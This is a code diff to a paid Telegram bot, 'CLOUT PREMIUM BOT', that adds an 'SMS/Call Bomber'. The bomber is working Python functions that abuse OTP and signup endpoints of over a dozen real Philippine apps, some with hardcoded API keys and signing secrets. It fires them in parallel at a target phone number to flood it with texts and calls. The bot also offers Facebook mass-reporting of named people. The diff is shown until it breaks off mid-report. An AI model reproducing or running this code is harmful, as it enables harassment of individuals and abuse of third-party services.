@@ -5,13 +5,18 @@ import os
 import random
 import string
 import time
+import io
+import hashlib
+import re
 from pathlib import Path
 from typing import Optional, Dict, Any
 from dataclasses import dataclass, asdict
 from datetime import datetime
 from urllib.parse import quote
+from concurrent.futures import ThreadPoolExecutor
 
 import aiohttp
+import requests
 from telegram import (
     Update,
     InlineKeyboardMarkup,
@@ -300,15 +305,16 @@ def main_keyboard(user_id: int) -> ReplyKeyboardMarkup:
     if is_admin(user_id):
         rows = [
             ["▸ Boost Services", "▸ TikTok Downloader"],
-            ["▸ FB Report", "▸ My Statistics"],
-            ["▸ Help", "▸ Generate Key"],
-            ["▸ Admin Panel"]
+            ["▸ FB Report", "▸ SMS/Call Bomber"],
+            ["▸ My Statistics", "▸ Help"],
+            ["▸ Generate Key", "▸ Admin Panel"]
         ]
     elif has_access(user_id):
         rows = [
             ["▸ Boost Services", "▸ TikTok Downloader"],
-            ["▸ FB Report", "▸ My Statistics"],
-            ["▸ Help", "▸ Redeem Key"]
+            ["▸ FB Report", "▸ SMS/Call Bomber"],
+            ["▸ My Statistics", "▸ Help"],
+            ["▸ Redeem Key"]
         ]
     else:
         rows = [
@@ -420,6 +426,15 @@ async def download_tiktok_video(update: Update, context: ContextTypes.DEFAULT_TY
                     await msg.edit_text("× Video URL not found in response.")
                     return
                 
+                await msg.edit_text("▸ Downloading video file...")
+                
+                async with session.get(video_url, timeout=60) as video_resp:
+                    if video_resp.status != 200:
+                        await msg.edit_text("× Failed to download video file from TikTok CDN.")
+                        return
+                    
+                    video_bytes = await video_resp.read()
+                
                 caption = (
                     f"◈ TikTok Video Downloaded\n"
                     f"━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -429,13 +444,18 @@ async def download_tiktok_video(update: Update, context: ContextTypes.DEFAULT_TY
                     f"▸ Description:\n{description}"
                 )
                 
-                await msg.edit_text("▸ Uploading video...")
+                await msg.edit_text("▸ Uploading video to Telegram...")
+                
+                video_file = io.BytesIO(video_bytes)
+                video_file.name = "tiktok_video.mp4"
                 
                 await context.bot.send_video(
                     chat_id=update.effective_chat.id,
-                    video=video_url,
+                    video=video_file,
                     caption=caption,
-                    supports_streaming=True
+                    supports_streaming=True,
+                    read_timeout=120,
+                    write_timeout=120
                 )
                 
                 await msg.delete()
@@ -549,205 +569,291 @@ async def fb_report_worker(session: aiohttp.ClientSession, fb_id: str, fb_name: 
         logger.error(f"FB Report Error: {type(e).__name__}: {e}")
         await progress_msg.edit_text(f"× Error: {e}")
 
+def format_phone(phone):
+    clean = re.sub(r'\D', '', phone)
+    if clean.startswith('63'):
+        clean = clean[2:]
+    if clean.startswith('0'):
+        clean = clean[1:]
+    return clean[:10]
+
+def format_phone_display(phone):
+    clean = format_phone(phone)
+    return f"+63{clean}"
+
+def random_string(length=10):
+    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
+    return ''.join(random.choice(chars) for _ in range(length))
+
+def random_email():
+    return f"{random_string(10)}@gmail.com"
+
+def current_timestamp():
+    return int(time.time())
+
+def current_timestamp_ms():
+    return int(time.time() * 1000)
+
+def mwell_send(phone):
+    try:
+        formatted = format_phone(phone)
+        timestamp = current_timestamp_ms()
+        headers = {
+            'User-Agent': 'okhttp/4.11.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json',
+            'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
+            'x-app-version': '03.942.035', 'x-device-type': 'android', 'x-device-model': 'oneplus CPH2465',
+            'x-timestamp': str(timestamp), 'x-request-id': random_string(16)
+        }
+        body = {'country': 'PH', 'phoneNumber': formatted, 'phoneNumberPrefix': '+63'}
+        r = requests.post('https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number', headers=headers, json=body, timeout=8)
+        return r.status_code == 200
+    except:
+        return False
+
+def pexx_send(phone):
+    try:
+        formatted = format_phone(phone)
+        headers = {'User-Agent': 'okhttp/4.12.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'appversion': '3.0.14', 'x-msession-id': 'undefined', 'tid': random_string(11)}
+        body = {'0': {'json': {'email': '', 'areaCode': '+63', 'phone': f'+63{formatted}', 'otpChannel': 'TG', 'otpUsage': 'REGISTRATION'}}}
+        r = requests.post('https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1', headers=headers, json=body, timeout=8)
+        return r.status_code == 200
+    except:
+        return False
+
+def supportvip_send(phone):
+    try:
+        formatted = format_phone(phone)
+        headers = {'User-Agent': 'okhttp/4.11.0', 'Accept-Encoding': 'gzip', 'boat': 'com.peso.loan.vip.credit', 'surface': '1.0.7', 'suggestion': 'd284bf47c4c1e4da4e3e6375498c6245', 'telescope': '', 'Content-Type': 'application/json; charset=utf-8'}
+        body = {'invasion': formatted, 'persist': 'login', 'threshold': False}
+        r = requests.post('https://supportviploan.com/pomelo/abortion/suffering/test', headers=headers, json=body, timeout=8)
+        return r.status_code == 200
+    except:
+        return False
+
+def ezloan_send(phone):
+    try:
+        formatted = format_phone(phone)
+        headers = {'User-Agent': 'okhttp/4.9.2', 'Accept': 'application/json', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'accept-language': 'en', 'imei': random_string(32), 'device': 'android', 'appversion': '2.0.4', 'appid': 'EZLOAN', 'businessid': 'EZLOAN'}
+        body = {'businessId': 'EZLOAN', 'contactNumber': f'+63{formatted}'}
+        r = requests.post('https://gateway.ezloancash.ph/security/auth/otp/request', headers=headers, json=body, timeout=8)
+        return r.status_code == 200
+    except:
+        return False
+
+def xpressph_send(phone):
+    try:
+        formatted = format_phone(phone)
+        timestamp = current_timestamp()
+        headers = {'User-Agent': 'Dalvik/2.1.0', 'Content-Type': 'application/json', 'Accept': 'application/json'}
+        body = {'FirstName': f'User{timestamp}', 'LastName': 'Test', 'Email': f'user{timestamp}@gmail.com', 'Phone': f'+63{formatted}'}
+        r = requests.post('https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp', headers=headers, json=body, timeout=8)
+        return r.status_code == 200
+    except:
+        return False
+
+def bistro_send(phone):
+    try:
+        formatted = format_phone(phone)
+        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 16; CPH2465 Build/BP2A.250605.031.A2; wv) AppleWebKit/537.36', 'Accept': 'application/json, text/plain, */*', 'x-requested-with': 'com.allcardtech.bistro'}
+        r = requests.get(f'https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{formatted}', headers=headers, timeout=8)
+        return r.status_code == 200
+    except:
+        return False
+
+def bayadcenter_send(phone):
+    try:
+        formatted = format_phone(phone)
+        headers = {'accept': 'application/json, text/plain, */*', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
+        body = {'mobileNumber': f'+63{formatted}', 'emailAddress': random_email()}
+        r = requests.post('https://api.online.bayad.com/api/sign-up/otp', headers=headers, json=body, timeout=8)
+        return r.status_code == 200
+    except:
+        return False
+
+def supremeloan_send(phone):
+    try:
+        formatted = format_phone(phone)
+        headers = {'User-Agent': 'okhttp/4.11.0', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'bill': '', 'syndrome': '1.1.3', 'throughout': 'com.supreme.money.loan', 'cute': 'd284bf47c4c1e4da4e3e6375498c6245', 'cure': '14.864864864864865', 'come': '121.05883328670785', 'Content-Type': 'application/json; charset=utf-8'}
+        body = {'aide': 'd284bf47c4c1e4da4e3e6375498c6245', 'exactly': formatted, 'sick': False}
+        r = requests.post('https://suprememoneyloan.com/berry/oak/puzzle/wipe/blade', headers=headers, json=body, timeout=8)
+        return r.status_code == 200
+    except:
+        return False
+
+def pickupcoffee_send(phone):
+    try:
+        formatted = format_phone(phone)
+        headers = {'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json', 'Accept': 'application/json'}
+        body = {'mobile_number': f'+63{formatted}', 'login_method': 'mobile_number'}
+        r = requests.post('https://production.api.pickup-coffee.net/v2/customers/login', headers=headers, json=body, timeout=8)
+        return r.status_code == 200
+    except:
+        return False
+
+def honeyloan_send(phone):
+    try:
+        formatted = format_phone(phone)
+        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 15)', 'Content-Type': 'application/json', 'Accept': 'application/json'}
+        body = {'phone': formatted}
+        r = requests.post('https://api.honeyloan.ph/api/client/registration/step-one', headers=headers, json=body, timeout=8)
+        return r.status_code == 200
+    except:
+        return False
+
+def kumuph_send(phone):
+    try:
+        formatted = format_phone(phone)
+        encrypt_timestamp = current_timestamp()
+        encrypt_rnd_string = random_string(32)
+        secret = "kumu_secret_2024"
+        sign_data = f"{encrypt_timestamp}{encrypt_rnd_string}{formatted}{secret}"
+        encrypt_signature = hashlib.sha256(sign_data.encode()).hexdigest()
+        headers = {'User-Agent': 'okhttp/5.0.0-alpha.14', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'Device-Type': 'android', 'Device-Id': random_string(16)}
+        body = {'country_code': '+63', 'encrypt_rnd_string': encrypt_rnd_string, 'cellphone': formatted, 'encrypt_signature': encrypt_signature, 'encrypt_timestamp': encrypt_timestamp}
+        r = requests.post('https://api.kumuapi.com/v2/user/sendverifysms', headers=headers, json=body, timeout=8)
+        return r.status_code == 200
+    except:
+        return False
+
+def s5com_send(phone):
+    try:
+        formatted = f"+63{format_phone(phone)}"
+        headers = {'accept': 'application/json, text/plain, */*', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36'}
+        body = f'phone_number={formatted}'
+        r = requests.post('https://api.s5.com/player/api/v1/otp/request', headers=headers, data=body, timeout=8)
+        return r.status_code == 200
+    except:
+        return False
+
+def cashalo_send(phone):
+    try:
+        formatted = format_phone(phone)
+        device_identifier = random_string(16)
+        headers = {'User-Agent': 'okhttp/4.12.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'x-api-key': 'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==', 'x-device-identifier': device_identifier, 'x-device-type': '1'}
+        body = {'phone_number': formatted, 'device_identifier': device_identifier, 'device_type': 1}
+        r = requests.post('https://api.cashaloapp.com/access/register', headers=headers, json=body, timeout=8)
+        return r.status_code == 200
+    except:
+        return False
+
+def mocasa_voice_send(phone):
+    try:
+        formatted = format_phone(phone)
+        if not formatted.startswith('9'):
+            return False
+        device_id = "0536db2db2b341e483de881c94e0e203"
+        payload = json.dumps({"country": "Philippines", "appVersion": 206, "appPackageName": "com.mocasa.ph", "mobile": formatted, "channel": "APP", "systemType": 0, "myDeviceId": device_id, "appCode": "mocasa", "sendChannel": "voice", "verifyType": 1, "token": ""})
+        headers = {'User-Agent': 'okhttp/4.8.0', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json'}
+        r = requests.post('https://service.mocasa.com/app/v1/login/sendVerifyCode', headers=headers, data=payload, timeout=15)
+        if r.status_code == 200:
+            resp = r.json()
+            return resp.get('code') == 0
+        return False
+    except:
+        return False
+
+SMS_SERVICES = [
+    ("MWELL", mwell_send), ("PEXX", pexx_send), ("SUPPORT VIP", supportvip_send),
+    ("EZLOAN", ezloan_send), ("XPRESS PH", xpressph_send), ("BISTRO", bistro_send),
+    ("BAYAD CENTER", bayadcenter_send), ("SUPREME LOAN", supremeloan_send),
+    ("PICKUP COFFEE", pickupcoffee_send), ("HONEY LOAN", honeyloan_send),
+    ("KUMU PH", kumuph_send), ("S5.COM", s5com_send), ("CASHALO", cashalo_send),
+]
+VOICE_SERVICES = [("MOCASA VOICE", mocasa_voice_send)]
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-
     if is_banned(user.id):
         await update.message.reply_text("× You are banned from this bot.")
         return
-
     get_or_create_user(user.id, user.username or "", user.first_name or "")
     context.user_data.clear()
-
     access_status = get_access_status(user.id)
-
     welcome_text = (
-        "╔════════════════════════════╗\n"
-        "║   CLOUT PREMIUM BOT        ║\n"
-        "╚════════════════════════════╝\n\n"
-        f"▸ Welcome, {user.first_name}!\n\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        f"◈ Access : {access_status}\n"
-        "━━━━━━━━━━━━━━━━━━━━\n\n"
-        "▸ AVAILABLE SERVICES\n"
-        "  ◈ Social Media Boosting\n"
-        "  ◈ TikTok Video Downloader\n"
-        "  ◈ Facebook Mass Report\n\n"
+        "╔════════════════════════════╗\n║   CLOUT PREMIUM BOT        ║\n╚════════════════════════════╝\n\n"
+        f"▸ Welcome, {user.first_name}!\n\n━━━━━━━━━━━━━━━━━━━━\n◈ Access : {access_status}\n━━━━━━━━━━━━━━━━━━━━\n\n"
+        "▸ AVAILABLE SERVICES\n  ◈ Social Media Boosting\n  ◈ TikTok Video Downloader\n  ◈ Facebook Mass Report\n  ◈ SMS/Call Bomber\n\n"
     )
-
     if not has_access(user.id) and not is_admin(user.id):
-        welcome_text += (
-            "━━━━━━━━━━━━━━━━━━━━\n"
-            "▸ GET ACCESS\n"
-            "  Contact admin to purchase.\n\n"
-            "▸ PRICING\n"
-            "  ◈ 3 Days    : $1.99\n"
-            "  ◈ 7 Days    : $3.99\n"
-            "  ◈ 30 Days   : $9.99\n"
-            "  ◈ Lifetime  : $29.99\n\n"
-            "Use '▸ Get Access' to redeem!"
-        )
+        welcome_text += "━━━━━━━━━━━━━━━━━━━━\n▸ GET ACCESS\n  Contact admin to purchase.\n\n▸ PRICING\n  ◈ 3 Days    : $1.99\n  ◈ 7 Days    : $3.99\n  ◈ 30 Days   : $9.99\n  ◈ Lifetime  : $29.99\n\nUse '▸ Get Access' to redeem!"
     else:
-        welcome_text += (
-            "━━━━━━━━━━━━━━━━━━━━\n"
-            "▸ Use menu buttons below to start!"
-        )
-
-    await update.message.reply_text(
-        welcome_text,
-        reply_markup=main_keyboard(user.id)
-    )
+        welcome_text += "━━━━━━━━━━━━━━━━━━━━\n▸ Use menu buttons below to start!"
+    await update.message.reply_text(welcome_text, reply_markup=main_keyboard(user.id))
 
 async def whoami(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     await update.message.reply_text(
-        f"▸ Your ID      : {user.id}\n"
-        f"▸ Username     : @{user.username or 'none'}\n"
-        f"▸ First Name   : {user.first_name}\n"
-        f"▸ Is Admin?    : {'YES ✅' if is_admin(user.id) else 'NO ❌'}\n"
-        f"▸ Has Access?  : {'YES ✅' if has_access(user.id) else 'NO ❌'}"
+        f"▸ Your ID      : {user.id}\n▸ Username     : @{user.username or 'none'}\n▸ First Name   : {user.first_name}\n"
+        f"▸ Is Admin?    : {'YES ✅' if is_admin(user.id) else 'NO ❌'}\n▸ Has Access?  : {'YES ✅' if has_access(user.id) else 'NO ❌'}"
     )
 
 async def boost_services(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-
     if is_banned(user.id):
         await update.message.reply_text("× You are banned from this bot.")
         return
-
     if SETTINGS.maintenance_mode and not is_admin(user.id):
         await update.message.reply_text("× Bot is under maintenance. Try again later.")
         return
-
     if not has_access(user.id):
-        await update.message.reply_text(
-            "× You need access to use boost services.\n\n"
-            "▸ Get your key from admin\n"
-            "▸ Use '▸ Get Access' to redeem!",
-            reply_markup=main_keyboard(user.id)
-        )
+        await update.message.reply_text("× You need access to use boost services.\n\n▸ Get your key from admin\n▸ Use '▸ Get Access' to redeem!", reply_markup=main_keyboard(user.id))
         return
-
     user_obj = get_or_create_user(user.id, user.username or "", user.first_name or "")
     user_obj.total_clicks += 1
     SETTINGS.total_clicks += 1
     save_users()
     save_settings()
-
     context.user_data.clear()
-
-    await update.message.reply_text(
-        "╔════════════════════════════╗\n"
-        "║    BOOST SERVICES          ║\n"
-        "╚════════════════════════════╝\n\n"
-        "▸ Select a platform :",
-        reply_markup=boost_category_keyboard()
-    )
+    await update.message.reply_text("╔════════════════════════════╗\n║    BOOST SERVICES          ║\n╚════════════════════════════╝\n\n▸ Select a platform :", reply_markup=boost_category_keyboard())
 
 async def handle_boost_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-
     data = query.data
-
     try:
         if data == "main_menu":
-            await query.edit_message_text(
-                "▸ Main Menu :",
-                reply_markup=main_keyboard(query.from_user.id)
-            )
+            await query.edit_message_text("▸ Main Menu :", reply_markup=main_keyboard(query.from_user.id))
             return
-
         if data == "back_to_categories":
-            await query.edit_message_text(
-                "╔════════════════════════════╗\n"
-                "║    BOOST SERVICES          ║\n"
-                "╚════════════════════════════╝\n\n"
-                "▸ Select a platform :",
-                reply_markup=boost_category_keyboard()
-            )
+            await query.edit_message_text("╔════════════════════════════╗\n║    BOOST SERVICES          ║\n╚════════════════════════════╝\n\n▸ Select a platform :", reply_markup=boost_category_keyboard())
             return
-
         if data.startswith("category:"):
             category = data.split(":")[1]
-
             if category == "tiktok":
-                text = (
-                    "╔════════════════════════════╗\n"
-                    "║    TIKTOK SERVICES         ║\n"
-                    "╚════════════════════════════╝\n\n"
-                    "▸ Click a service to boost :"
-                )
+                text = "╔════════════════════════════╗\n║    TIKTOK SERVICES         ║\n╚════════════════════════════╝\n\n▸ Click a service to boost :"
                 kb = tiktok_services_keyboard()
             elif category == "instagram":
-                text = (
-                    "╔════════════════════════════╗\n"
-                    "║   INSTAGRAM SERVICES       ║\n"
-                    "╚════════════════════════════╝\n\n"
-                    "▸ Click a service to boost :"
-                )
+                text = "╔════════════════════════════╗\n║   INSTAGRAM SERVICES       ║\n╚════════════════════════════╝\n\n▸ Click a service to boost :"
                 kb = instagram_services_keyboard()
             elif category == "facebook":
-                text = (
-                    "╔════════════════════════════╗\n"
-                    "║    FACEBOOK SERVICES       ║\n"
-                    "╚════════════════════════════╝\n\n"
-                    "▸ Click a service to boost :"
-                )
+                text = "╔════════════════════════════╗\n║    FACEBOOK SERVICES       ║\n╚════════════════════════════╝\n\n▸ Click a service to boost :"
                 kb = facebook_services_keyboard()
             else:
                 return
-
             await query.edit_message_text(text, reply_markup=kb)
             return
-
     except Exception as e:
         logger.error(f"BOOST OUTER ERROR: {type(e).__name__}: {e}")
 
 async def get_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-
     if has_access(user.id):
         access_status = get_access_status(user.id)
-        await update.message.reply_text(
-            f"✓ You already have access!\n\n"
-            f"◈ Status : {access_status}"
-        )
+        await update.message.reply_text(f"✓ You already have access!\n\n◈ Status : {access_status}")
         return
-
     context.user_data.clear()
     context.user_data['awaiting'] = 'key'
-
-    await update.message.reply_text(
-        "╔════════════════════════════╗\n"
-        "║     REDEEM ACCESS KEY      ║\n"
-        "╚════════════════════════════╝\n\n"
-        "▸ Enter your access key below.\n\n"
-        "▸ Format : CLOUT-XXXXXXXXXXXX\n\n"
-        "Type /cancel to go back."
-    )
+    await update.message.reply_text("╔════════════════════════════╗\n║     REDEEM ACCESS KEY      ║\n╚════════════════════════════╝\n\n▸ Enter your access key below.\n\n▸ Format : CLOUT-XXXXXXXXXXXX\n\nType /cancel to go back.")
 
 async def handle_key_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     key_string = update.message.text.strip()
     context.user_data.pop('awaiting', None)
-
     result = redeem_key(update.effective_user.id, key_string)
-
     if result['success']:
-        await update.message.reply_text(
-            result['message'],
-            reply_markup=main_keyboard(update.effective_user.id)
-        )
+        await update.message.reply_text(result['message'], reply_markup=main_keyboard(update.effective_user.id))
         user = update.effective_user
         try:
-            await context.bot.send_message(
-                ADMIN_ID,
-                f"◈ KEY REDEEMED\n"
-                f"━━━━━━━━━━━━━━━━━━━━\n\n"
-                f"▸ User : {user.first_name}\n"
-                f"▸ ID   : {user.id}\n"
-                f"▸ Key  : {key_string}"
-            )
+            await context.bot.send_message(ADMIN_ID, f"◈ KEY REDEEMED\n━━━━━━━━━━━━━━━━━━━━\n\n▸ User : {user.first_name}\n▸ ID   : {user.id}\n▸ Key  : {key_string}")
         except:
             pass
     else:
@@ -757,355 +863,312 @@ async def handle_key_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def my_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user = get_or_create_user(user_id, update.effective_user.username or "", update.effective_user.first_name or "")
-
     access_status = get_access_status(user_id)
-
     stats_text = (
-        "╔════════════════════════════╗\n"
-        "║     YOUR STATISTICS        ║\n"
-        "╚════════════════════════════╝\n\n"
-        f"▸ Name       : {user.first_name}\n"
-        f"▸ ID         : {user.user_id}\n"
-        f"▸ Access     : {access_status}\n"
-        f"▸ Keys Used  : {user.total_keys_used}\n"
-        f"▸ Total Clicks: {user.total_clicks}\n"
+        "╔════════════════════════════╗\n║     YOUR STATISTICS        ║\n╚════════════════════════════╝\n\n"
+        f"▸ Name       : {user.first_name}\n▸ ID         : {user.user_id}\n▸ Access     : {access_status}\n"
+        f"▸ Keys Used  : {user.total_keys_used}\n▸ Total Clicks: {user.total_clicks}\n"
         f"▸ Joined     : {datetime.fromtimestamp(user.joined_at).strftime('%Y-%m-%d')}"
     )
     await update.message.reply_text(stats_text)
 
 async def fb_report_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-
     if is_banned(user.id):
         await update.message.reply_text("× You are banned from this bot.")
         return
-
     if not has_access(user.id) and not is_admin(user.id):
-        await update.message.reply_text(
-            "× You need access to use FB Report.\n\n"
-            "▸ Use '▸ Get Access' to redeem a key.",
-            reply_markup=main_keyboard(user.id)
-        )
+        await update.message.reply_text("× You need access to use FB Report.\n\n▸ Use '▸ Get Access' to redeem a key.", reply_markup=main_keyboard(user.id))
         return
-
     context.user_data.clear()
     context.user_data['awaiting'] = 'fb_id'
-
-    await update.message.reply_text(
-        "╔════════════════════════════╗\n"
-        "║     FACEBOOK REPORT        ║\n"
-        "╚════════════════════════════╝\n\n"
-        "▸ Enter the Facebook ID of the target :\n"
-        "▸ Example : 100012345678901\n\n"
-        "Type /cancel to go back."
-    )
+    await update.message.reply_text("╔════════════════════════════╗\n║     FACEBOOK REPORT        ║\n╚════════════════════════════╝\n\n▸ Enter the Facebook ID of the target :\n▸ Example : 100012345678901\n\nType /cancel to go back.")
 
 async def handle_fb_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     fb_id = update.message.text.strip()
-    
     if not fb_id.isdigit():
-        await update.message.reply_text(
-            "× Invalid ID. Please enter numbers only.\n\n"
-            "Type /cancel to go back."
-        )
+        await update.message.reply_text("× Invalid ID. Please enter numbers only.\n\nType /cancel to go back.")
         context.user_data['awaiting'] = 'fb_id'
         return
-    
     context.user_data['fb_id'] = fb_id
     context.user_data['awaiting'] = 'fb_name'
-    
-    await update.message.reply_text(
-        "▸ Now enter the Facebook Name of the target :\n"
-        "▸ Example : John Doe\n\n"
-        "Type /cancel to go back."
-    )
+    await update.message.reply_text("▸ Now enter the Facebook Name of the target :\n▸ Example : John Doe\n\nType /cancel to go back.")
 
 async def handle_fb_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
     fb_name = update.message.text.strip()
-    
     if len(fb_name) < 2:
-        await update.message.reply_text(
-            "× Name too short. Please enter a valid name.\n\n"
-            "Type /cancel to go back."
-        )
+        await update.message.reply_text("× Name too short. Please enter a valid name.\n\nType /cancel to go back.")
         context.user_data['awaiting'] = 'fb_name'
         return
-    
     context.user_data['fb_name'] = fb_name
     context.user_data['awaiting'] = 'fb_count'
-    
-    await update.message.reply_text(
-        "▸ How many reports to send? (1-50)\n"
-        "▸ Example : 10\n\n"
-        "Type /cancel to go back."
-    )
+    await update.message.reply_text("▸ How many reports to send? (1-50)\n▸ Example : 10\n\nType /cancel to go back.")
 
 async def handle_fb_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
-    
     try:
         count = int(text)
         if count < 1 or count > 50:
             raise ValueError("Count must be 1-50")
     except ValueError:
-        await update.message.reply_text(
-            "× Invalid count. Please enter a number between 1 and 50.\n\n"
-            "Type /cancel to go back."
-        )
+        await update.message.reply_text("× Invalid count. Please enter a number between 1 and 50.\n\nType /cancel to go back.")
         context.user_data['awaiting'] = 'fb_count'
         return
-    
     fb_id = context.user_data.get('fb_id')
     fb_name = context.user_data.get('fb_name')
-    
     if not fb_id or not fb_name:
         await update.message.reply_text("× Session expired. Please start again.")
         context.user_data.clear()
         return
-    
     context.user_data.clear()
-    
-    progress_msg = await update.message.reply_text(
-        f"▸ Starting FB Report...\n"
-        f"▸ Target : {fb_name} ({fb_id})\n"
-        f"▸ Count  : {count}\n\n"
-        "▸ Please wait..."
-    )
-    
+    progress_msg = await update.message.reply_text(f"▸ Starting FB Report...\n▸ Target : {fb_name} ({fb_id})\n▸ Count  : {count}\n\n▸ Please wait...")
     async with aiohttp.ClientSession() as session:
         await fb_report_worker(session, fb_id, fb_name, count, progress_msg, update)
+
+async def sms_bomber_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if is_banned(user.id):
+        await update.message.reply_text("× You are banned from this bot.")
+        return
+    if not has_access(user.id) and not is_admin(user.id):
+        await update.message.reply_text("× You need access to use SMS/Call Bomber.\n\n▸ Use '▸ Get Access' to redeem a key.", reply_markup=main_keyboard(user.id))
+        return
+    context.user_data.clear()
+    context.user_data['bomber_awaiting'] = 'phone'
+    await update.message.reply_text("╔════════════════════════════╗\n║    SMS/CALL BOMBER         ║\n╚════════════════════════════╝\n\n▸ Enter target phone number:\n▸ Format: 09XXXXXXXXX or 9XXXXXXXXX\n\nType /cancel to go back.")
+
+async def handle_bomber_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    phone = update.message.text.strip()
+    valid = format_phone(phone)
+    if len(valid) != 10 or not valid.startswith('9'):
+        await update.message.reply_text("× Invalid Philippine number. Please try again.\n\nType /cancel to go back.")
+        context.user_data['bomber_awaiting'] = 'phone'
+        return
+    context.user_data['bomber_phone'] = valid
+    context.user_data['bomber_awaiting'] = 'rounds'
+    await update.message.reply_text(f"▸ Target: {format_phone_display(valid)}\n\n▸ Enter SMS Rounds (1-10):\n▸ Example: 3\n\nType /cancel to go back.")
+
+async def handle_bomber_rounds(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text.strip()
+    try:
+        rounds = int(text)
+        if rounds < 1 or rounds > 10:
+            raise ValueError
+    except:
+        await update.message.reply_text("× Invalid. Enter a number between 1 and 10.\n\nType /cancel to go back.")
+        context.user_data['bomber_awaiting'] = 'rounds'
+        return
+    context.user_data['bomber_rounds'] = rounds
+    context.user_data['bomber_awaiting'] = 'calls'
+    await update.message.reply_text(f"▸ SMS Rounds: {rounds}\n\n▸ Enter Voice Calls (1-10):\n▸ Example: 3\n\nType /cancel to go back.")
+
+async def handle_bomber_calls(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text.strip()
+    try:
+        calls = int(text)
+        if calls < 1 or calls > 10:
+            raise ValueError
+    except:
+        await update.message.reply_text("× Invalid. Enter a number between 1 and 10.\n\nType /cancel to go back.")
+        context.user_data['bomber_awaiting'] = 'calls'
+        return
+    context.user_data['bomber_calls'] = calls
+    context.user_data['bomber_awaiting'] = 'confirm'
+    phone = context.user_data.get('bomber_phone')
+    rounds = context.user_data.get('bomber_rounds')
+    
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔥 DEPLOY", callback_data="bomber:deploy")],
+        [InlineKeyboardButton("× CANCEL", callback_data="bomber:cancel")]
+    ])
+    
+    await update.message.reply_text(
+        f"╔════════════════════════════╗\n║    RAPID FIRE CONFIG       ║\n╚════════════════════════════╝\n\n"
+        f"▸ Target : {format_phone_display(phone)}\n▸ SMS Rounds : {rounds}\n▸ Voice Calls : {calls}\n\n"
+        f"▸ Are you sure you want to deploy?",
+        reply_markup=kb
+    )
+
+async def handle_bomber_deploy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == "bomber:cancel":
+        context.user_data.clear()
+        await query.edit_message_text("× Operation cancelled.")
+        return
+        
+    phone = context.user_data.get('bomber_phone')
+    rounds = context.user_data.get('bomber_rounds')
+    calls = context.user_data.get('bomber_calls')
+    
+    if not phone or not rounds or not calls:
+        await query.edit_message_text("× Session expired. Please start again.")
+        return
+        
+    context.user_data.clear()
+    await query.edit_message_text("🔥 RAPID FIRE DEPLOYED\n\n▸ Launching parallel attacks...")
+    
+    start_time = time.time()
+    
+    loop = asyncio.get_event_loop()
+    with ThreadPoolExecutor(max_workers=30) as executor:
+        futures = []
+        for _ in range(rounds):
+            for name, func in SMS_SERVICES:
+                futures.append(loop.run_in_executor(executor, func, phone))
+        for _ in range(calls):
+            for name, func in VOICE_SERVICES:
+                futures.append(loop.run_in_executor(executor, func, phone))
+        
+        results = await asyncio.gather(*futures)
+        
+    sms_success = 0
+    sms_total = 0
+    voice_success = 0
+    voice_total = 0
+    
+    idx = 0
+    for _ in range(rounds):
+        for name, _ in SMS_SERVICES:
+            sms_total += 1
+            if results[idx]: sms_success += 1
+            idx += 1
+            
+    for _ in range(calls):
+        for name, _ in VOICE_SERVICES:
+            voice_total += 1
+            if results[idx]: voice_success += 1
+            idx += 1
+            
+    elapsed = time.time() - start_time
+    
+    report = (
+        f"╔════════════════════════════╗\n║      BATTLE REPORT         ║\n╚════════════════════════════╝\n\n"
+        f"▸ Target    : {format_phone_display(phone)}\n▸ Time      : {elapsed:.2f} seconds\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"▸ SMS OK    : {sms_success}/{sms_total} ({sms_success*100//sms_total if sms_total > 0 else 0}%)\n"
+        f"▸ SMS FAIL  : {sms_total - sms_success}/{sms_total}\n"
